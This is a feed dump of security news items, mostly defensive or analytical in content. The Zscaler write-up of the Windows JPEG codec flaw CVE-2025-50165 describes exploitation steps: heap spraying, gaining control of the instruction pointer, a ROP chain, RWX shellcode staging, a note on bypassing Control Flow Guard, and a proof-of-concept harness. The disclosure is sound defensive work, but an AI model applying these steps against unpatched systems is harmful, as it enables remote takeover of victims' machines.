these internal and external assessments, we believe our implementation provides a strong security foundation for cross-platform file sharing for both Android and iOS users. We will continue to evaluate and enhance the implementation\u2019s security in collaboration with additional third-party partners.\n</p>\n<p>\nTo complement this deep technical audit, we also sought expert third-party perspective on our approach from <a href=\"https://crypto.stanford.edu/~dabo/\">Dan Boneh</a>, a renowned security expert and professor at Stanford University:\n</p>\n<p>\n\u201cGoogle\u2019s work on this feature, including the use of memory safe Rust for the core communications layer, is a strong example of how to build secure interoperability, ensuring that cross-platform information sharing remains safe. I applaud the effort to open more secure information sharing between platforms and encourage Google and Apple to work together more on this.\"\n</p>\n<h3>The Future of File-Sharing Should Be Interoperable</h3>\n\n\n<p>\nThis is just the first step as we work to improve the experience and expand it to more devices. We look forward to continuing to work with industry partners to make connecting and communicating across platforms a secure, seamless experience for all users.\n</p>",

Enterprises receive thousands of security alerts every single day, and human analysts manually collecting and correlating threat data can\u2019t keep up. These reactive workflows lead to slow threat detection and delayed response, giving attackers more time to cause damage. The result is not only missed attacks but also burned-out analysts, who face constant alert fatigue and repetitive tasks.&lt;/p&gt;\n    &lt;p&gt;When a breach can unfold in minutes, organizations can\u2019t afford hours (or days) of lag. Threat intelligence automation allows security teams to respond to indicators of compromise (IOCs) within seconds, stopping attacks before they spread\u2014and reducing the potential financial and reputational damages from a breach. The push for speed has spurred a rise in &lt;a href=\"https://www.recordedfuture.com/resources/guides/state-of-ai-2025\" rel=\"noreferrer\" target=\"_blank\"&gt;AI and automation&lt;/a&gt; across cybersecurity as security leaders increasingly recognize how real-time, autonomous decisions can bolster defense.&lt;/p&gt;\n    &lt;h2&gt;What Is Automated Threat Protection?&lt;/h2&gt;\n    &lt;p&gt;Automated threat protection, also known as autonomous threat protection, refers to the use of advanced technologies\u2014including AI and ML\u2014to continuously gather, analyze, and act on threat intelligence without manual intervention. It streamlines the entire threat intelligence lifecycle, from data collection to detection to response, at machine speed.&lt;/p&gt;\n    &lt;p&gt;Core capabilities of automated threat protection platforms include ingesting data from diverse sources (open web, dark web, technical feeds, internal logs, etc.), automatically correlating and analyzing threat signals, and triggering protective actions or alerts. Key functions often include real-time monitoring for IOCs, enrichment of alerts with contextual data, automated risk scoring of threats, and even initiating response workflows via SOAR (Security Orchestration, Automation, and Response) playbooks. These systems excel at processing information at a scale and speed impossible for human operators.&lt;/p&gt;\n    &lt;p&gt;To illustrate the difference: in a manual workflow, if a new phishing domain targeting your company is discovered, an analyst might spend precious time gathering WHOIS information, checking threat feeds for references, assessing the domain\u2019s legitimacy, and then coordinating a response. By the time this manual analysis is done, the phishing campaign could have claimed victims. In contrast, automated threat protection can instantly recognize the suspicious domain, enrich the alert with WHOIS data and threat actor profiles, check if the domain appears in malware or phishing databases, and even automatically block the domain via integrated security controls, all before a human even starts investigating.&lt;/p&gt;\n    &lt;h2&gt;How Threat Intelligence Automation Enhances Real-Time Security Decisions&lt;/h2&gt;\n    &lt;p&gt;Threat intelligence automation &lt;a href=\"https://www.recordedfuture.com/blog/from-speed-to-consistency-power-automation-for-your-soc\" rel=\"noreferrer\" target=\"_blank\"&gt;directly improves the speed and quality of security decisions&lt;/a&gt; in several ways:&lt;/p&gt;\n    &lt;h3&gt;Faster Detection and Response&lt;/h3&gt;\n    &lt;p&gt;Automation enables security teams to detect threats or intrusions within moments of their emergence. By automatically correlating internal logs with external intelligence feeds, an automated system can spot malicious activity and trigger a response in machine time. This might mean isolating a compromised host or alerting on a zero-day exploit mere seconds after it\u2019s observed. The net effect is that incidents are contained before they escalate widely.&lt;/p&gt;\n    &lt;h3&gt;Reduced False Positives&lt;/h3&gt;\n    &lt;p&gt;Intelligent automation learns what \u201cnormal\u201d looks like in an environment and filters out the noise of benign events or erroneous alerts. Over time, machine learning models can identify patterns of false positives and automatically dismiss or deprioritize them. By letting automation sift signal from noise, human analysts can reclaim hours of wasted time and focus attention on genuine threats.&lt;/p&gt;\n    &lt;h3&gt;Improved Threat Prioritization&lt;/h3&gt;\n    &lt;p&gt;Automated threat intelligence tools provide rich context around each indicator or alert instantly. For example, when an alert comes in, an automation system might automatically append information about the involved IP\u2019s reputation, associated malware, threat actor groups, prevalence in the wild, and more. This contextual enrichment allows the system to assess which alerts pose the greatest risk.&lt;/p&gt;\n    &lt;h3&gt;Consistent, round-the-clock protection&lt;/h3&gt;\n    &lt;p&gt;Automated systems never sleep, operating 24/7 with consistency and scaling to handle surges in threat activity. This around-the-clock monitoring means critical warnings are never missed and aligns security operations to the always-on nature of cyber attacks. Automation also enforces consistency in how threats are handled; a playbook executed by a machine will run the same way every time, reducing the variability (and potential errors) of human responses.&lt;/p&gt;\n    &lt;h2&gt;Recorded Future\u2019s Approach to Automated Threat Protection&lt;/h2&gt;\n    &lt;p&gt;Recorded Future\u2019s Intelligence Cloud is a SaaS platform that delivers real-time, automated threat intelligence at scale. It continuously collects billions of data points from across the open web, dark web, technical sources (like malware feeds and network telemetry), as well as insights from Recorded Future\u2019s own research team, &lt;a href=\"https://www.recordedfuture.com/research/insikt-group\" rel=\"noreferrer\" target=\"_blank\"&gt;Insikt Group\u00ae&lt;/a&gt;. All of this data is analyzed and risk-scored in real time using machine learning algorithms.&lt;/p&gt;\n    &lt;p&gt;A key strength of Recorded Future\u2019s approach is seamless integration. The Intelligence Cloud connects directly with popular SIEM, SOAR, EDR, and Threat Intelligence Platform (TIP) tools. This means when your SOC\u2019s SIEM generates an alert, Recorded Future automatically enriches that alert with context within the tool you\u2019re already using. If an alert about a suspicious IP comes into your SIEM, the Intelligence Cloud can, in real time, append that IP\u2019s risk score, known associations, or related domains\u2014even triggering automated response playbooks in your SOAR platform based on its intelligence.&lt;/p&gt;\n    &lt;p&gt;Recorded Future\u2019s platform assigns risk scores to IOCs in real time, using analytics that weigh factors like novelty, prevalence, and severity of associated threat activity. So when an alert involving a particular IOC hits a SOC, the Intelligence Cloud has already flagged it as high risk and enriched it with context, such as the ransomware family or threat actor.&lt;/p&gt;\n    &lt;p&gt;Recorded Future\u2019s approach centers on delivering actionable insight in real time and &lt;a href=\"https://www.recordedfuture.com/use-case/automation-security-workflows\" rel=\"noreferrer\" target=\"_blank\"&gt;automating wherever possible&lt;/a&gt;. Teams can trust they\u2019re never operating on out-of-date information, and that many threat defense actions are happening autonomously at machine speed.&lt;/p&gt;\n    &lt;p&gt;Example use cases include:&lt;/p&gt;\n    &lt;ul&gt;\n      &lt;li&gt;&lt;strong&gt;Phishing detection:&lt;/strong&gt; Suppose a new phishing email campaign targeting a financial institution is identified. Recorded Future\u2019s Intelligence Cloud can automatically spot the phishing domains or URLs as soon as they appear on phishing feeds or dark web forums, immediately flagging them as malicious, enriching them with context, and integrating with your email security or firewall to block them.&lt;/li&gt;\n      &lt;li&gt;&lt;strong&gt;Vulnerability prioritization:&lt;/strong&gt; Recorded Future\u2019s automation helps organizations stay ahead by tracking vulnerability disclosures and exploit chatter continuously. If a new critical vulnerability is published, the Intelligence Cloud will instantly assess if there are exploit kits or threat actors discussing it. Through integrations, it can automatically create a ticket in your ITSM or send an alert to your vulnerability management dashboard highlighting that this CVE is under active attack and should be prioritized.&lt;/li&gt;\n    &lt;/ul&gt;\n    &lt;h2&gt;Benefits of Adopting Recorded Future for Automated Threat Protection&lt;/h2&gt;\n    &lt;h3&gt;Speed and Scale in Decision-Making&lt;/h3&gt;\n    &lt;p&gt;Through automation, organizations can make security decisions at a speed and scale that human teams alone cannot match. Threats are identified, contextualized, and even countered in real time. This machine-speed detection and response means attacks can be thwarted before they escalate into major incidents, compressing the threat response timeline from what might be hours or days down to minutes.&lt;/p&gt;\n    &lt;h3&gt;Better Resource Allocation&lt;/h3&gt;\n    &lt;p&gt;When you automate data gathering and initial threat analysis, skilled personnel are freed up to focus on what they do best: in-depth investigations, incident response, threat hunting, and security strategy. This not only improves job satisfaction but also means your team\u2019s expertise is directed at tasks that truly require human judgement. This often leads to cost savings or the ability to handle more threats with the same headcount.&lt;/p&gt;\n    &lt;h3&gt;Continuous Monitoring With Global Visibility&lt;/h3&gt;\n    &lt;p&gt;Recorded Future provides continuous, 24/7 monitoring of threats worldwide. It\u2019s like having an around-the-clock sentry that never takes a break. Organizations gain insight into emerging threats and external risks relevant to them, no matter where those threats originate. If a threat actor in another part of the world starts planning attacks against your industry, Recorded Future\u2019s platform may pick up on early warning signs and automatically alert you. This means you\u2019re not only monitoring your internal environment but also the external horizon for incoming risks, all through an automated system.&lt;/p&gt;\n    &lt;h3&gt;Reduced time to detect and respond&lt;/h3&gt;\n    &lt;p&gt;Ultimately, adopting an automated threat intelligence solution like Recorded Future dramatically reduces the Mean Time to Detect (MTTD) and Mean Time to Respond (MTTR) for security incidents. Automated response or enrichment means incidents can be contained or remediated far faster. A faster detection/response cycle directly correlates with minimizing damage\u2014the quicker you intercept an attack, the less harm it can do. If you can cut your detection time from the &lt;a href=\"https://www.ibm.com/reports/data-breach\" rel=\"noreferrer\" target=\"_blank\"&gt;industry average&lt;/a&gt; of ~200 days down to near real-time, you potentially save millions in breach costs.&lt;/p&gt;\n    &lt;h3&gt;Strengthened security posture&lt;/h3&gt;\n    &lt;p&gt;By integrating real-time insights and automated actions into daily operations, organizations can close security gaps and achieve a more consistent defense posture. Automation ensures that no critical threat intelligence is missed or ignored, and that defenses are applied uniformly across the board. Moreover, automation enforces best practices automatically, ensuring processes are followed correctly every time. All of this leads to a significant uplift in an organization\u2019s ability to prevent breaches and handle incidents effectively.&lt;/p&gt;\n    &lt;h2&gt;Practical Applications and Use Cases&lt;/h2&gt;\n    &lt;h3&gt;Automated IOC Detection&lt;/h3&gt;\n    &lt;p&gt;Modern threat intelligence platforms can automatically detect and surface indicators of compromise that matter to your organization. Rather than relying on an analyst to manually find a malicious IP or file hash buried in feeds, automation pulls these out in real time. If chatter about a new malware hash or command-and-control server related to your industry appears on a dark web forum, for example, the system will immediately flag it, ensuring you learn of emerging threats the moment they arise.&lt;/p&gt;\n    &lt;h3&gt;Threat Hunting with Automated Enrichment&lt;/h3&gt;\n    &lt;p&gt;Threat hunters and researchers greatly benefit from automation when investigating suspicious events. Suppose an analyst is digging into an odd network beacon that might indicate a hidden attacker. With automated enrichment tools, they can get additional context in seconds, such as domain reputation, related threats, or historical occurrences of that indicator. The analyst enters the indicator and the platform aggregates intelligence from open source feeds, commercial intel, and internal data. This on-demand enrichment provides deeper insights instantly, improving both the speed and accuracy of threat hunts.&lt;/p&gt;\n    &lt;h3&gt;Proactive Defense Through Vulnerability Intelligence&lt;/h3&gt;\n    &lt;p&gt;Rather than playing catch-up after hackers exploit a vulnerability, organizations can use threat intelligence automation to stay ahead of exploits. Automated systems continuously track CVEs, exploit releases, and even discussions on hacking forums about particular software weaknesses. When something relevant to your tech stack pops up, the system will alert you and provide threat context (e.g., known exploits or ransomware leveraging that CVE). This proactive vulnerability intelligence means you can patch or implement mitigations before an attack hits.&lt;/p&gt;\n    &lt;p&gt;There are a range of ways in which &lt;a href=\"https://www.recordedfuture.com/case-studies\" rel=\"noreferrer\" target=\"_blank\"&gt;different sectors&lt;/a&gt; leverage threat intelligence &lt;a href=\"https://go.recordedfuture.com/automation-ebook\" rel=\"noreferrer\" target=\"_blank\"&gt;automation&lt;/a&gt; in ways tailored to their unique challenges:&lt;/p&gt;\n    &lt;h3&gt;Financial Services&lt;/h3&gt;\n    &lt;p&gt;&lt;a href=\"https://www.recordedfuture.com/industry/financial\" rel=\"noreferrer\" target=\"_blank\"&gt;Banks and financial institutions&lt;/a&gt; face constant phishing, fraud, and account takeover attempts. Threat intelligence automation helps instantly flag things like fraudulent banking websites impersonating the institution, or dumps of customer credentials on the dark web. If a fake banking login page is spun up to phish customers, an automated system can detect that site and raise an alert before any customers fall victim. Similarly, automation assists in fraud detection by correlating internal transaction anomalies with known threat patterns in real time. If a series of suspicious money transfers aligns with a known fraud tactic described in threat intel reports, the system can bring it to analysts\u2019 attention immediately.&lt;/p&gt;\n    &lt;h3&gt;Government&lt;/h3&gt;\n    &lt;p&gt;&lt;a href=\"https://www.recordedfuture.com/industry/public-sector\" rel=\"noreferrer\" target=\"_blank\"&gt;Government agencies&lt;/a&gt; and defense organizations are high-value targets for state-sponsored cyber attacks. Threat intelligence automation gives these SOCs an upper hand by continuously scanning for indicators of nation-state campaigns targeting them. For instance, an automated platform might monitor for malware signatures, spear-phishing themes, or infrastructure known to be used by groups hostile to a particular country. The moment something matching those patterns is found, the system immediately alerts the security team. This real-time awareness is critical for government SOCs to mobilize defenses against advanced threats.&lt;/p&gt;\n    &lt;h3&gt;Healthcare&lt;/h3&gt;\n    &lt;p&gt;&lt;a href=\"https://www.recordedfuture.com/industry/healthcare\" rel=\"noreferrer\" target=\"_blank\"&gt;Hospitals and healthcare providers&lt;/a&gt; are frequently targeted by ransomware, data theft, and other cyberattacks that can literally put lives at risk. Automated threat intelligence in healthcare monitors for signs of impending attacks and provides early warnings. If an underground forum post indicates interest in exploiting a particular healthcare software, the security team can be alerted to fortify that system preemptively. This sector also benefits from automation in disrupting criminal activities: for example, automated systems can detect illicit online marketplaces selling stolen patient data or fake pharmaceutical websites that could harm public trust.&lt;/p&gt;\n    &lt;h2&gt;Future of Threat Intelligence Automation&lt;/h2&gt;\n    &lt;p&gt;As cyber threats evolve, automated defense systems will evolve alongside them, becoming self-learning. In the near future, these systems could autonomously adjust detection thresholds or even launch countermeasures based on learned experience, further reducing the need for human tuning. Recorded Future is at the forefront of this trend, embedding advanced AI into its Intelligence Cloud for capabilities like predictive risk scoring, anomaly detection at scale, and automated decision support. The vision is that intelligence automation becomes an indispensable co-pilot for every security team, helping humans make better decisions faster.&lt;/p&gt;\n    &lt;p&gt;However, it\u2019s important to note that attackers are also embracing AI to automate and enhance their attacks. In response, &lt;a href=\"https://www.recordedfuture.com/blog/state-of-ai-and-automation-in-threat-intelligence\" rel=\"noreferrer\" target=\"_blank\"&gt;defensive AI systems&lt;/a&gt; are being developed to spot AI-generated threats and respond at machine speed. In this escalating battle, organizations that invest early in threat intelligence automation and AI will possess the agile, self-updating defenses needed to counter AI-augmented cyber attacks.&lt;/p&gt;\n    &lt;h2&gt;Start Protecting Your Business With Threat Intelligence Automation Today&lt;/h2&gt;\n    &lt;p&gt;Cyber attacks are accelerating and evolving on a daily basis. This reality makes traditional, purely manual security operations untenable. The longer it takes to detect and respond to threats, the greater the potential damage. By automating intelligence collection and response, organizations drastically improve their chances of stopping breaches in time.&lt;/p&gt;\n    &lt;p&gt;Recorded Future\u2019s Intelligence Cloud offers an unparalleled combination of real-time breadth , analytical depth, and seamless actionability.&lt;/p&gt;\n    &lt;p&gt;&lt;strong&gt;Ready to accelerate your security operations with threat intelligence automation?&lt;/strong&gt; Reach out for a &lt;a href=\"https://www.recordedfuture.com/get-started\" rel=\"noreferrer\" target=\"_blank\"&gt;demo or trial&lt;/a&gt; to experience how real-time threat intelligence automation can make all the difference in protecting your business.&lt;/p&gt;\n</code></pre>\n<p>Article Link: <a class=\"inline-onebox\" href=\"https://www.recordedfuture.com/blog/threat-intelligence-automation\">Threat Intelligence Automation</a></p>\n            <p><small>1 post - 1 participant</small></p>\n            <p><a href=\"https://malware.news/t/threat-intelligence-automation/101813\">Read full topic</a></p>",

      "title": "CVE-2025-50165: Critical Flaw in Windows Graphics Component",
      "link": "https://www.zscaler.com/blogs/security-research/cve-2025-50165-critical-flaw-windows-graphics-component",
      "summary": "IntroductionIn May 2025, Zscaler ThreatLabz discovered&nbsp;CVE-2025-50165, a critical remote code execution (RCE) vulnerability with a CVSS score of 9.8 that impacts the Windows Graphics Component. The vulnerability lies within&nbsp;windowscodecs.dll, and any application that uses this library as a dependency is vulnerable to compromise, such as a Microsoft Office document. For example, attackers can exploit the vulnerability by creating a malicious JPEG image and inserting it into any file that leverages&nbsp;windowscodecs.dll. If a user opens that file, their system can be compromised by an attacker who can go on to perform RCE and take over the victim\u2019s system.Microsoft released a&nbsp;patch to fix the vulnerability on August 12, 2025. Since the Windows Graphics Component is a critical part of all Windows systems, this vulnerability poses a significant security threat to every impacted Windows system.&nbsp;Affected VersionsThe following table outlines the specific Microsoft Windows products and versions impacted by CVE-2025-50165, and the corresponding patched versions that address the vulnerability:ProductImpacted VersionPatched VersionWindows Server 202510.0.26100.485110.0.26100.4946Windows 11 Version 24H2 for x64-based Systems10.0.26100.485110.0.26100.4946Windows 11 Version 24H2 for ARM64-based Systems10.0.26100.485110.0.26100.4946Windows Server 2025 (Server Core installation)10.0.26100.485110.0.26100.4946Table 1: Impacted Windows versions with vulnerable&nbsp;windowscodecs.dll and their patched versions.RecommendationsThreatLabz recommends Windows users&nbsp;update applications&nbsp;and&nbsp;install the patched versions&nbsp;specified in the affected versions table above.Attack ChainThe attack chain begins with a maliciously crafted JPEG image designed to exploit the vulnerability. This malicious image, when rendered via the&nbsp;windowscodecs.dll, will trigger the vulnerability. The exploit can also be triggered indirectly by embedding the image in another file such as a Microsoft Office document. When the exploit is triggered, the attacker can execute arbitrary code.How It WorksThis section references the methodology used by ThreatLabz to discover and analyze CVE-2025-50165. We touch on how ThreatLabz identified the vulnerable code path, the process of triaging the crash, and the development of a Proof-of-Concept (PoC) exploit.Identify the vulnerable path for fuzzingIn the figure below, line 51 served as the entry point for fuzzing. At this line, the original\u00a0FileSize value can be replaced with\u00a0MutatedBufferSize. This modification controls the buffer contents returned by\u00a0MapViewOfFile and defines the snapshot\u2019s entry point for subsequent fuzzing operations.Figure 1: IDA decompilation of the function\u00a0GpReadOnlyMemoryStream::InitFile.Crash analysisThe fuzzing process successfully identified a crash, as shown in the figure below.Figure 2: Crash analysis of Microsoft Visio captured in WinDbg.The WinDbg output pinpointed the crashing instruction as\u00a0call qword ptr [r8+10h] ds:0000080667c170=c0c0c0c0c0c0c0c0. This showed\u00a0r8+10h was being dereferenced but pointed to uninitialized memory, a state identifiable by the\u00a0c0c0c0c0c0c0c0c0 pattern used by Gflags. Further examination of the\u00a0r8 register's memory dump, shown in the figure below, revealed this uninitialized memory could be user-controlled through heap spraying.Figure 3: Memory dump of\u00a0r8 register in WinDbg.The address\u00a00000015fc1cab170 contained the untrusted function pointer. The pointer\u00a0was dereferenced at the\u00a0windowscodecs!jpeg_finish_compress+0xcc instruction, directly leading to the crash. To understand the execution flow that led to this point, ThreatLabz conducted a stack trace analysis, as illustrated below.STACK_TEXT:  \nRetAddr               Call Site\n00007ffe`a8da58bb     WindowsCodecs!jpeg_finish_compress+0xcc\n00007ffe`a8d4b6cd     WindowsCodecs!CJpegTurboFrameEncode::HrWriteSource+0x46b\n00007ff7`16d6218b     WindowsCodecs!CFrameEncodeBase::WriteSource+0x18dThe WinDbg stack trace highlighted three prominent functions within\u00a0windowsCodecs.dll:\u00a0jpeg_finish_compressCJpegTurboFrameEncode::HrWriteSourceCFrameEncodeBase::WriteSourceFurther investigation into the stack trace and additional research revealed the vulnerability's precise origin and the corresponding\u00a0code snippet. By modifying the path to the crafted JPEG file, the exact location of the vulnerability\u2019s trigger was pinpointed to the execution of\u00a0piFrameEncode-&gt;WriteSource, as shown in the example below.\u00a0[ REDACTED ]\n// Create the decoder.\nif (SUCCEEDED(hr))\n{\n \u00a0\u00a0\u00a0hr = piFactory-&gt;CreateDecoderFromFilename(L\"/path/to/poc.jpg\", NULL, GENERIC_READ,\n \u00a0\u00a0\u00a0        WICDecodeMetadataCacheOnDemand, // For JPEG lossless decoding/encoding.\n \u00a0\u00a0\u00a0        &amp;piDecoder);\n}\n[ REDACTED ]\nif (SUCCEEDED(hr))\n{\n \u00a0\u00a0\u00a0hr = piFrameEncode-&gt;WriteSource(\n \u00a0\u00a0\u00a0         static_cast (piFrameDecode),\n \u00a0\u00a0\u00a0         NULL); // Using NULL enables JPEG lossless encoding.\n}ExploitANALYST NOTE: Control Flow Guard (CFG) is disabled for the 32-bit version of\u00a0windowscodecs.dll by default. However, the 64-bit version requires a CFG bypass to successfully exploit the vulnerability.By leveraging heap spraying and exploiting the untrusted pointer dereference vulnerability, control of the instruction pointer (IP) can be obtained which enables further exploitation through Return-Oriented Programming (ROP). This is achieved with the following steps:Allocate a series of heap chunks, each sized\u00a00x3ef7, with the ROP chain data stored within them.Free some of these heap chunks and return them to the free list so that one is reallocated as the victim chunk.Trigger the untrusted pointer dereference vulnerability.Use RIP control to employ a stack pivot gadget and redirect execution to the ROP chain stored within the heap.The figure below shows the exploitation process and the resulting crash output.Figure 4: Illustration of the exploitation steps and the resulting crash output captured in WinDbg.With control of the IP established through the exploitation process, the next phase involves leveraging ROP gadgets to achieve arbitrary code execution. These gadgets are used to create a Read-Write-Execute (RWX) memory region using a function like\u00a0VirtualAlloc. Once the RWX memory is set up, additional ROP gadgets such as\u00a0mov dword [rax],\u00a0rcx, where\u00a0RAX points to the shellcode address and\u00a0RCX contains the shellcode data, are used to write the malicious shellcode into this newly created memory region. Finally, execution is redirected to the shellcode by jumping to the address of the\u00a0RWX memory.Proof-of-Concept (PoC)To demonstrate the exploitation of the vulnerability, ThreatLabz created an example application which allows the user to control the heap and process the JPEG image using the three functions.\u00a0Enables the creation of heap allocations with user-specified inputs:Index: Specifies the location in a global array where the allocated heap address will be stored (e.g., index 0, 1, ...).Size: Determines the size of the heap memory block to allocate.Data: Represents the value stored within the allocated memory block.Frees a heap allocation based on the provided index value.Accepts Base64-encoded JPEG image data and uses the\u00a0JPEG re-encode example code to process the image.Terminates the application.In the figure below, the memory address\u00a00X00007FF7F0BB448, displayed as\u00a0Reward, represents the virtual memory address of the application\u2019s main function. This address allows users to calculate the base address where the application\u2019s process is mapped in memory, providing critical information for exploitation. Using options 1 and 2, users can perform a heap spray attack by densely allocating and freeing heap memory chunks to control the layout of data in memory. Option 3 then triggers the vulnerability by processing a specially crafted JPEG image, leveraging the heap spray setup to manipulate the application\u2019s control flow and gain access to memory required for exploitation.Figure 5: Core functionality of the executable used to demonstrate the PoC.Check out this\u00a0video for a detailed demonstration of RIP control in the example application, showing how RCE is achieved during the exploitation process.\nConclusionWith a CVSS score of 9.8, CVE-2025-50165 poses a significant risk to all Windows environments as the Microsoft Graphics Component is integral to all Windows environments. It is critical that Windows users update applications and install the patched versions in a timely manner.Zscaler CoverageThe Zscaler ThreatLabz team has deployed protection for CVE-2025-50165.",

      "summary": "<p>I\u2019m excited to share some big news! We\u2019ve just rolled out a massive update to DetectionStream, and it\u2019s one that I had planned to add for a while: <strong>full Suricata integration</strong>.</p><img alt=\"\" height=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*IQlhd5-DXOS4WgF9fCx3-A@2x.png\" width=\"\" />Search, Analyze and Parse Suricata Detections Rules<h3>Why Suricata?</h3><p>It hasn\u2019t been that long, but the feedback I\u2019ve received for <a href=\"https://DetectionStream.com\" rel=\"noopener\" target=\"_blank\">DetectionStream</a> has been overwhelmingly positive. People love the tool for working with detection rules, but it was primarily focused on endpoint and log-based detections with frameworks like Sigma and YARA. I wanted to expand and show some love to the network-based detections, and Suricata was the obvious&nbsp;choice.</p><p>Suricata is an open-source powerhouse for network intrusion detection (IDS), and by bringing it into the DetectionStream family, we\u2019re giving you a single platform to search for and manage Suricata&nbsp;rules.</p><h3>What\u2019s Included in the&nbsp;Update</h3><h3>1. The Complete Emerging Threats&nbsp;Ruleset</h3><p>We didn\u2019t just add Suricata support; we went all in. DetectionStream now comes pre-loaded with the <strong>entire Emerging Threats Open ruleset</strong>, which is over <strong>45,000 rules</strong>! This means you have a massive library of network-based detections at your fingertips from day one, ready to be searched, analyzed, and deployed.</p><h3>2. Create and Share Your Own&nbsp;Rules</h3><p>Of course, you\u2019re not limited to the pre-loaded rules. You can now <strong>create your own Suricata rules</strong> directly within DetectionStream. Whether you\u2019re crafting a quick rule for IOC scanning on exported PCAPs or building custom detections for your environment, you can write, test, and save your rules all in one&nbsp;place.</p><p>And because community is at the heart of what we do, you can also <strong>share your rules with&nbsp;others</strong>!</p><h3>3. The Suricata Playground: Test Your Rules in the&nbsp;Browser</h3><p>This is the part I\u2019m most excited about. I\u2019ve built an interactive <strong>Suricata Playground</strong> that lets you test your rules against PCAP files directly in your browser. You don\u2019t need to set up a local Suricata instance or spin up a lab environment (with a caveat, more on that&nbsp;below).</p><p><strong>How it&nbsp;works:</strong></p><ol><li><strong>Write or paste</strong> your Suricata rule into the&nbsp;editor.</li><li><strong>Upload a PCAP file</strong> containing network&nbsp;traffic.</li><li><strong>Run the simulation</strong> and see if your rule triggers any detections.</li></ol><p>It\u2019s a simple, fast, and private way to validate your rules. All the parsing and matching happens on the client-side, so your PCAP files never leave your&nbsp;browser.</p><img alt=\"\" height=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*d3cKTAk5rNQT3ZaQPAY3YQ@2x.png\" width=\"\" />The new Suricata playground<h3>A Deeper Dive into the Playground\u2019s Methodology</h3><p>I want to be transparent about how the playground works under the hood. Instead of running a full Suricata engine on a server, we\u2019ve built a lightweight <strong>Suricata simulator in TypeScript</strong> that runs entirely in your browser. This approach has some significant benefits, especially for privacy and instant feedback.</p><p>When you upload a PCAP, it\u2019s parsed on the client-side, and our simulator mimics Suricata\u2019s signature matching logic for stateless rules. It supports common protocols like TCP, UDP, HTTP, DNS, and TLS, and keywords such as content, nocase, http.uri, dns.query, and&nbsp;tls.sni.</p><p>To ensure that the rules are effective and not just lazy (e.g., alert ip any any -&gt; any any), we\u2019ve implemented a system we call <strong>\"Explicit Packet Targeting.\"</strong></p><p>Here\u2019s how it works for the upcoming challenges: when a challenge is created, we run the solution rule and record exactly which packets in the PCAP should trigger an alert. When you submit your rule, it must alert on that <em>exact</em> set of packets \u2014 no more, no less. This ensures that your rule is precise and doesn\u2019t generate false positives.</p><p><strong>A Quick Note on Limitations:</strong></p><p>To make this client-side simulation possible, we had to make some trade-offs. The playground is designed for quick validation of stateless, content-driven rules. It\u2019s perfect for checking if your basic patterns and content matches are working as expected.</p><p>However, it doesn\u2019t support more advanced, stateful features like flowbits, pcre, or byte_test. For those, you\u2019ll still want to validate your rules on a full Suricata sensor. We believe the playground is a powerful assistive tool that will speed up your workflow, even with these limitations.</p><h3>What\u2019s Next: Suricata Challenges</h3><p>We\u2019re not stopping here. Soon, we\u2019ll be introducing <strong>Suricata Challenges</strong> to the platform. Just like our Sigma challenges, you\u2019ll be able to test your skills by writing Suricata rules to solve real-world scenarios, compete on the leaderboard, and earn bragging&nbsp;rights.</p><p>The same \u201cExplicit Packet Targeting\u201d methodology will be used to validate your challenge submissions, ensuring a fair and competitive environment that rewards precision and accuracy.</p><p><strong>Want to try it out now?</strong> I\u2019ve created a sample challenge for you to get started. Give it a shot and see if you can write a detection rule that passes the validation:</p><p> <a href=\"https://detectionstream.com/suricata/training/challenge/0682ee66-4924-426d-8404-294fe56c1765\" rel=\"noopener\" target=\"_blank\">Try the Sample Suricata Challenge</a></p><h3>Give It a&nbsp;Try!</h3><p>This update is all about empowering you to build better network detections and to learn and experiment with Suricata along the way. I\u2019d love for you to jump in, explore the new features, and let me know what you think.

While China has not openly articulated an offensive cyber strategy, official doctrines repeatedly stress that both offense and defense are essential to achieving the goal of becoming a \u201ccyber superpower\u201d (\u7f51\u7edc\u5f3a\u56fd). These documents outline the broad structure of China\u2019s offensive cyber forces and underscore the significant role expected of the private sector.</p><p>An early articulation of China\u2019s approach appears in the 2013 edition of <a href=\"https://www.airuniversity.af.edu/Portals/10/CASI/documents/Translations/2021-02-08%20Chinese%20Military%20Thoughts-%20In%20their%20own%20words%20Science%20of%20Military%20Strategy%202013.pdf\" rel=\"noopener\" target=\"_blank\">the Science of Military Strategy</a>, published by People\u2019s Liberation Army (PLA) Academy of Military Science \u2013 the PLA\u2019s highest-level research institute. The document argues that the ubiquity of the internet and the blurring of civilian\u2013military networks have expanded the number of actors engaged in cyber operations. Alongside dedicated military cyber units and relevant government departments, such as the Ministry of Public Security (MPS) and the Ministry of State Security (MSS), the document explicitly includes civilian forces, including private companies, as part of the teams that conduct cyber attack and defense. This framing has pushed private firms to develop offensive and defensive tooling and to conduct cyber operations.</p><p>To improve offensive and defensive capabilities, talent is crucial. The Chinese Ministry of Education has taken the lead in defining \u201cattack and defense capabilities\u201d (\u653b\u9632\u80fd\u529b) within a broader concept of live-fire (\u5b9e\u6218\u5316) capabilities.<a href=\"https://nattothoughts.substack.com#footnote-2\" rel=\"noopener\" target=\"_blank\">2</a></p><p>In 2022, China\u2019s Ministry of Education published a \u201cWhite Paper on the Live-Fire Capabilities of Cybersecurity Talents: Attack and Defense Live-Fire Capability Edition\u201d (English translation <a href=\"https://cset.georgetown.edu/publication/china-cyber-talent-white-paper-2022/\" rel=\"noopener\" target=\"_blank\">here</a>). It defined four types of cybersecurity talent live-fire capabilities: \u201cattack and defense live-fire capabilities,\u201d \u201cvulnerability mining capabilities,\u201d \u201cengineering development capabilities,\u201d and \u201ccombat effectiveness evaluation capabilities.\u201d Regarding attack and defense live-fire capabilities specifically, the White Paper stated that they refer to:</p><ul><li><p>the ability to use cybersecurity technologies and tools to carry out security monitoring and analysis,</p></li><li><p>risk assessment,</p></li><li><p>penetration test event research and judgment [i.e. evaluation],</p></li><li><p>security operations and maintenance, and</p></li><li><p>emergency response in real business environments.</p></li></ul><p>Although framed as defensive, labeling these skills as \u201cattack and defense\u201d live-fire capabilities implies their applicability in \u201cattack\u201d scenarios as well. Unlike in Western discourse, which traditionally distinguished between offense and defense, China treats the two as mutual elements of an <a href=\"https://web.archive.org/web/20240516162755/http:/www.81.cn/jfjbmap/content/2019-10/01/content_244473.htm\" rel=\"noopener\" target=\"_blank\">active defense approach</a>, with an emphasis on preemptive offensive actions and integrated offense-defense.

